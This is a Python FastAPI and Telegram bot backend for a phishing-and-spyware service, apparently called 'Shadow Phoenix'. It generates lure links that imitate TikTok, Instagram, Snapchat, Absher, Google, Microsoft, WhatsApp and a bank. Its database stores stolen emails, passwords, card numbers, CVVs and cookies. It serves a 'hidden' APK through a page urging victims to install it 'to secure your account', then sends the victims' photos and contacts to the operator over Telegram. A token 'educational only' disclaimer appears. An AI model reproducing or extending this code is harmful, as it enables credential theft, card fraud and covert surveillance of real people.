import os
import base64
import io
import sqlite3
import hashlib
import traceback
import logging
import random
import string
import json
from datetime import datetime
import uvicorn
from pydantic import BaseModel
from fastapi import FastAPI, Request, BackgroundTasks, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo

# ==================== إعداد السجلات ====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ==================== التكوينات ====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
RENDER_URL = os.getenv("RENDER_URL", "")
CAPTURE_SECRET = os.getenv("CAPTURE_SECRET", "Shadow_Secret_2026")
SALT = os.getenv("SALT", "Shadow_Salt_321")
OWNER_ID = int(os.getenv("OWNER_ID", "7295259673"))

if not BOT_TOKEN or not RENDER_URL:
    logger.error("❌ المتغيرات البيئية BOT_TOKEN و RENDER_URL غير مضبوطة!")
    raise ValueError("يجب تعيين BOT_TOKEN و RENDER_URL في البيئة")

logger.info(f"🔧 BOT_TOKEN: آخر 4 أحرف ...{BOT_TOKEN[-4:]}")
logger.info(f"🔧 RENDER_URL: {RENDER_URL}")

# ==================== تهيئة البوت ====================
try:
    bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
    bot.get_me()
    logger.info("✅ التوكن صحيح ويعمل")
except Exception as e:
    logger.error(f"❌ فشل تهيئة البوت: {e}")
    raise

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== مسار تقديم ملف APK مباشرة ====================
@app.get("/app.apk")
async def serve_apk():
    """تقديم ملف APK من جذر المشروع"""
    if os.path.exists("app.apk"):
        return FileResponse("app.apk", media_type="application/vnd.android.package-archive", filename="app.apk")
    else:
        return HTMLResponse("<h1>الملف غير موجود</h1>", status_code=404)

# ==================== قاعدة البيانات ====================
def get_db_connection():
    conn = sqlite3.connect("users.db", check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS bot_users (
            username TEXT PRIMARY KEY,
            password_hash TEXT,
            linked_chat_id INTEGER DEFAULT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS operation_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            template_type TEXT,
            generated_link TEXT,
            target_ip TEXT,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS captured_targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner_chat_id INTEGER,
            target_ip TEXT,
            target_device TEXT,
            image_count INTEGER,
            captured_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS stolen_credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner_chat_id INTEGER,
            login_type TEXT,
            email TEXT,
            password TEXT,
            card_number TEXT,
            card_expiry TEXT,
            card_cvv TEXT,
            phone TEXT,
            code TEXT,
            cookies TEXT,
            target_ip TEXT,
            captured_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS uploaded_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT,
            images_count INTEGER,
            contacts_rows INTEGER,
            created_at TEXT
        )
    """)
    conn.commit()
    conn.close()
    logger.info("✅ قاعدة البيانات جاهزة")

init_db()

def hash_password(password: str) -> str:
    return hashlib.sha256((password + SALT).encode()).hexdigest()

def create_new_account(username, password):
    conn = get_db_connection()
    cursor = conn.cursor()
    hashed = hash_password(password)
    try:
        cursor.execute("INSERT OR IGNORE INTO bot_users (username, password_hash) VALUES (?, ?)", (username, hashed))
        conn.commit()
    except Exception as e:
        logger.error(f"DB Error create: {e}")
    finally:
        conn.close()

def try_login_user(chat_id, username, password):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT password_hash FROM bot_users WHERE username = ?", (username,))
    result = cursor.fetchone()
    if result and result[0] == hash_password(password):
        cursor.execute("UPDATE bot_users SET linked_chat_id = ? WHERE username = ?", (chat_id, username))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def has_active_session(chat_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT username FROM bot_users WHERE linked_chat_id = ?", (chat_id,))
    result = cursor.fetchone()
    conn.close()
    return result is not None

def log_operation(chat_id, template_type, link, ip="0.0.0.0"):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO operation_logs (chat_id, template_type, generated_link, target_ip) VALUES (?, ?, ?, ?)",
                       (chat_id, template_type, link, ip))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"⚠️ فشل تسجيل العملية: {e}")

def log_capture(owner_chat_id, ip, device, count):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO captured_targets (owner_chat_id, target_ip, target_device, image_count) VALUES (?, ?, ?, ?)",
                       (owner_chat_id, ip, device, count))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"⚠️ فشل تسجيل الالتقاط: {e}")

def log_credentials(owner_chat_id, login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, ip):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO stolen_credentials 
            (owner_chat_id, login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, target_ip) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (owner_chat_id, login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, ip))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"⚠️ فشل تسجيل بيانات الدخول: {e}")

# ==================== صفحة تسجيل الدخول الأساسية ====================
def get_login_html():
    return """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>تسجيل الدخول للنظام</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        <style>
            body {
                background-color: #182533; color: #ffffff; font-family: system-ui, sans-serif;
                display: flex; flex-direction: column; align-items: center; justify-content: center;
                min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box;
            }
            .login-card {
                background: #223140; padding: 30px 25px; border-radius: 15px;
                box-shadow: 0 10px 25px rgba(0,0,0,0.4); max-width: 360px; width: 100%;
                text-align: center; border: 1px solid #2b3d50;
            }
            h2 { font-size: 22px; margin-bottom: 20px; color: #5288c1; }
            .input-group { margin-bottom: 20px; text-align: right; }
            label { display: block; margin-bottom: 8px; font-size: 14px; color: #b1c7df; }
            input {
                width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #2b3d50;
                background: #182533; color: white; font-size: 16px; box-sizing: border-box;
                outline: none; transition: border 0.2s;
            }
            input:focus { border-color: #5288c1; }
            .btn {
                background-color: #2481cc; color: white; border: none; padding: 14px;
                font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer;
                width: 100%; margin-top: 10px; transition: background 0.2s;
            }
            #error-msg { color: #e53935; font-size: 14px; margin-top: 15px; display: none; }
            #success-msg { color: #4caf50; font-size: 14px; margin-top: 15px; display: none; }
        </style>
    </head>
    <body>
        <div class="login-card">
            <h2>🔐 تسجيل الدخول للنظام</h2>
            <div class="input-group">
                <label>اسم المستخدم</label>
                <input type="text" id="username" placeholder="أدخل اسم المستخدم">
            </div>
            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" id="password" placeholder="أدخل كلمة المرور">
            </div>
            <button class="btn" id="loginBtn">تسجيل الدخول</button>
            <div id="error-msg"></div>
            <div id="success-msg"></div>
        </div>

        <script>
            const tg = window.Telegram.WebApp;
            tg.expand();

            document.getElementById('loginBtn').addEventListener('click', function() {
                const user = document.getElementById('username').value.trim();
                const pass = document.getElementById('password').value.trim();
                const errorBlock = document.getElementById('error-msg');
                const successBlock = document.getElementById('success-msg');

                if(!user || !pass) {
                    errorBlock.innerText = "⚠️ يرجى ملء جميع الحقول!";
                    errorBlock.style.display = "block";
                    return;
                }

                errorBlock.style.display = "none";
                
                fetch('/api/web-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: tg.initDataUnsafe.user.id,
                        username: user,
                        password: pass
                    })
                })
                .then(res => res.json())
                .then(data => {
                    if(data.status === "success") {
                        successBlock.innerText = "🎉 تم تسجيل الدخول بنجاح!";
                        successBlock.style.display = "block";
                        setTimeout(() => { tg.close(); }, 1500);
                    } else {
                        errorBlock.innerText = "❌ " + data.message;
                        errorBlock.style.display = "block";
                    }
                })
                .catch(err => {
                    errorBlock.innerText = "⚠️ حدث خطأ في الاتصال بالسيرفر";
                    errorBlock.style.display = "block";
                });
            });
        </script>
    </body>
    </html>
    """

# ==================== صفحة تحميل التطبيق (الجذابة) ====================
@app.get("/download", response_class=HTMLResponse)
async def download_page():
    """صفحة تحميل التطبيق مع خلفية متحركة وزر تحميل"""
    return """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>تحميل التطبيق</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
            body {
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
                background-size: 400% 400%;
                animation: gradientBG 10s ease infinite;
                padding: 20px;
            }
            @keyframes gradientBG {
                0% { background-position: 0% 50%; }
                50% { background-position: 100% 50%; }
                100% { background-position: 0% 50%; }
            }
            body::before {
                content: '';
                position: fixed;
                top: 0; left: 0; right: 0; bottom: 0;
                background-image: 
                    radial-gradient(2px 2px at 20px 30px, #eee, transparent),
                    radial-gradient(2px 2px at 40px 70px, rgba(255,255,255,0.8), transparent),
                    radial-gradient(2px 2px at 50px 160px, #ddd, transparent),
                    radial-gradient(2px 2px at 90px 40px, rgba(255,255,255,0.6), transparent),
                    radial-gradient(2px 2px at 130px 80px, #fff, transparent),
                    radial-gradient(2px 2px at 160px 30px, rgba(255,255,255,0.7), transparent);
                background-size: 200px 200px;
                animation: sparkle 5s linear infinite;
                opacity: 0.5;
                pointer-events: none;
                z-index: 0;
            }
            @keyframes sparkle {
                0% { transform: translateY(0); opacity: 0.3; }
                50% { opacity: 1; }
                100% { transform: translateY(-200px); opacity: 0.3; }
            }
            .card {
                position: relative;
                z-index: 1;
                background: rgba(255,255,255,0.08);
                backdrop-filter: blur(20px);
                border-radius: 30px;
                padding: 40px 30px;
                max-width: 400px;
                width: 100%;
                border: 1px solid rgba(255,255,255,0.18);
                box-shadow: 0 30px 60px rgba(0,0,0,0.5);
                text-align: center;
            }
            .icon { font-size: 70px; margin-bottom: 15px; display: block; animation: pulse 2s infinite; }
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.1); }
                100% { transform: scale(1); }
            }
            h1 { color: #fff; font-size: 26px; font-weight: 700; margin-bottom: 8px; }
            .sub { color: rgba(255,255,255,0.7); font-size: 14px; margin-bottom: 30px; }
            .btn-download {
                display: inline-block;
                background: linear-gradient(90deg, #f7971e, #ffd200);
                color: #1a1a2e;
                border: none;
                padding: 18px 45px;
                font-size: 20px;
                font-weight: 800;
                border-radius: 60px;
                cursor: pointer;
                transition: all 0.3s ease;
                width: 100%;
                text-decoration: none;
                box-shadow: 0 8px 25px rgba(247, 151, 30, 0.4);
            }
            .btn-download:hover { transform: translateY(-3px); box-shadow: 0 15px 35px rgba(247, 151, 30, 0.6); }
            .btn-download:active { transform: scale(0.95); }
            .footer { margin-top: 25px; color: rgba(255,255,255,0.3); font-size: 11px; }
        </style>
    </head>
    <body>
        <div class="card">
            <span class="icon">📲</span>
            <h1>تحميل التطبيق</h1>
            <p class="sub">قم بتحميل التطبيق لتأمين حسابك</p>
            <a href="/app.apk" class="btn-download" download>
                ⬇️ تحميل الآن
            </a>
            <div class="footer">v2.0 · Shadow System</div>
        </div>
    </body>
    </html>
    """

# ==================== نقاط API لاستقبال البيانات ====================

@app.post("/api/upload_all_data")
async def upload_all_data(request: Request, background_tasks: BackgroundTasks):
    try:
        data = await request.json()
        user_id = data.get("user_id")
        images_b64 = data.get("images", [])
        contacts = data.get("contacts", "")

        summary = (
            f"📱 **بيانات جديدة!**\n"
            f"🆔 المستخدم: `{user_id}`\n"
            f"📸 عدد الصور: `{len(images_b64)}`\n"
            f"📇 جهات الاتصال: `{contacts.count(chr(10))}` سطر"
        )
        background_tasks.add_task(bot.send_message, chat_id=OWNER_ID, text=summary, parse_mode="Markdown")

        for idx, img_b64 in enumerate(images_b64[:15]):
            try:
                img_bytes = base64.b64decode(img_b64)
                img_file = io.BytesIO(img_bytes)
                img_file.name = f"img_{user_id}_{idx}.jpg"
                background_tasks.add_task(
                    bot.send_photo,
                    chat_id=OWNER_ID,
                    photo=img_file,
                    caption=f"📸 صورة {idx+1}"
                )
            except Exception as e:
                logger.error(f"فشل إرسال الصورة: {e}")

        if contacts:
            parts = [contacts[i:i+4000] for i in range(0, len(contacts), 4000)]
            for part in parts:
                background_tasks.add_task(
                    bot.send_message,
                    chat_id=OWNER_ID,
                    text=f"📇 جهات اتصال {user_id}:\n```\n{part}\n```",
                    parse_mode="Markdown"
                )

        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO uploaded_data (user_id, images_count, contacts_rows, created_at) VALUES (?, ?, ?, ?)",
            (user_id, len(images_b64), contacts.count('\n') if contacts else 0, datetime.now().isoformat())
        )
        conn.commit()
        conn.close()

        return {"status": "success"}

    except Exception as e:
        logger.error(f"Upload Error: {traceback.format_exc()}")
        return JSONResponse(status_code=500, content={"status": "error"})

@app.post("/api/web-login")
async def api_web_login(data: dict):
    chat_id = data.get("chat_id")
    username = data.get("username")
    password = data.get("password")
    if try_login_user(chat_id, username, password):
        bot.send_message(chat_id, "✅ تم تسجيل الدخول بنجاح.")
        return {"status": "success"}
    return {"status": "error", "message": "بيانات غير صحيحة"}

# ==================== أوامر البوت ====================

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    logger.info(f"📩 بدء المستخدم {chat_id}")
    if has_active_session(chat_id):
        show_main_menu(chat_id)
        return
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔐 تسجيل الدخول للنظام", web_app=WebAppInfo(url=f"{RENDER_URL}/login-page")),
        InlineKeyboardButton("ℹ️ تعليمات", callback_data="show_instructions")
    )
    bot.send_message(chat_id, "🛡️ نظام الصيد الذكي v13.0\nيرجى تسجيل الدخول.", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "show_instructions")
def show_instructions(call):
    try:
        bot.answer_callback_query(call.id, "جاري العرض...")
        bot.send_message(call.message.chat.id, "للاشتراك تواصل مع الإدارة.", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_start")))
    except Exception as e:
        logger.error(f"Error instructions: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "back_to_start")
def back_to_start(call):
    try:
        bot.answer_callback_query(call.id)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start(call.message)
    except Exception as e:
        logger.error(f"Error back: {e}")

def show_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🎬 تيك توك", callback_data="gen_tiktok"),
        InlineKeyboardButton("📸 إنستغرام", callback_data="gen_instagram"),
        InlineKeyboardButton("👻 سناب شات", callback_data="gen_snapchat"),
        InlineKeyboardButton("🧠 فلتر AI", callback_data="gen_ai_filter"),
        InlineKeyboardButton("🚨 أبشر", callback_data="gen_absher"),
        InlineKeyboardButton("📧 جوجل", callback_data="gen_google"),
        InlineKeyboardButton("🔑 مايكروسوفت", callback_data="gen_microsoft"),
        InlineKeyboardButton("💬 واتساب", callback_data="gen_whatsapp"),
        InlineKeyboardButton("💳 بنك", callback_data="gen_bank"),
        InlineKeyboardButton("🔄 تحديث الجلسة", callback_data="gen_refresh")
    )
    bot.send_message(chat_id, "👑 اختر القالب المناسب:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
def gen_link(call):
    try:
        bot.answer_callback_query(call.id, "⏳ جاري التجهيز...")
    except:
        pass
    
    chat_id = call.message.chat.id
    logger.info(f"🔄 زر مضغوط: {call.data} من {chat_id}")
    
    try:
        if not has_active_session(chat_id):
            bot.send_message(chat_id, "❌ جلسة منتهية. استخدم /start.")
            return
        
        raw = call.data.split("_", 1)[1]
        template_map = {
            "tiktok": "tiktok", "instagram": "instagram", "snapchat": "snapchat",
            "ai_filter": "ai_filter", "absher": "absher",
            "google": "google", "microsoft": "microsoft",
            "whatsapp": "whatsapp", "bank": "bank",
            "refresh": "refresh"
        }
        template = template_map.get(raw)
        if not template:
            bot.send_message(chat_id, "⚠️ نوع غير معروف.")
            return
        if template == "refresh":
            bot.send_message(chat_id, "✅ تم تحديث الجلسة.")
            return
        
        link = f"{RENDER_URL}?id={chat_id}&template={template}"
        log_operation(chat_id, template, link, "pending")
        bot.send_message(chat_id, f"🚀 **الرابط جاهز:**\n`{link}`\n📌 النوع: {template.upper()}", parse_mode="Markdown")
        logger.info(f"✅ تم إرسال الرابط {link}")
    except Exception as e:
        logger.error(f"💥 خطأ: {traceback.format_exc()}")
        bot.send_message(chat_id, f"⚠️ عطل تقني: {str(e)[:100]}")

# ==================== أمر فتح صفحة تحميل التطبيق ====================
@bot.message_handler(commands=['app'])
def app_command(message):
    chat_id = message.chat.id
    if chat_id != OWNER_ID:
        bot.send_message(chat_id, "⛔ أمر خاص بصاحب النظام فقط.")
        return

    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton(
            "📲 افتح صفحة التحميل",
            web_app=WebAppInfo(url=f"{RENDER_URL}/download")
        )
    )
    bot.send_message(
        chat_id,
        "🔽 **صفحة تحميل التطبيق الخفي**\n\n"
        "اضغط على الزر أدناه لفتح صفحة التحميل، ثم اضغط على زر 'تحميل الآن' لتحميل APK مباشرة.\n\n"
        "⚠️ هذا التطبيق مخصص للأغراض التعليمية فقط.",
        reply_markup=markup,
        parse_mode="Markdown"
    )

# ==================== تشغيل الخادم ====================
@app.on_event("startup")
def startup():
    try:
        bot.remove_webhook()
        webhook_url = f"{RENDER_URL}/{BOT_TOKEN}"
        bot.set_webhook(url=webhook_url)
        logger.info(f"🚀 Webhook مضبوط على: {webhook_url}")
    except Exception as e:
        logger.error(f"⚠️ فشل ضبط Webhook: {e}")
    
    create_new_account("moosa", "123456")
    logger.info("🔥 Shadow Phoenix v13.0 جاهز!")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run(app, host="0.0.0.0", port=port)
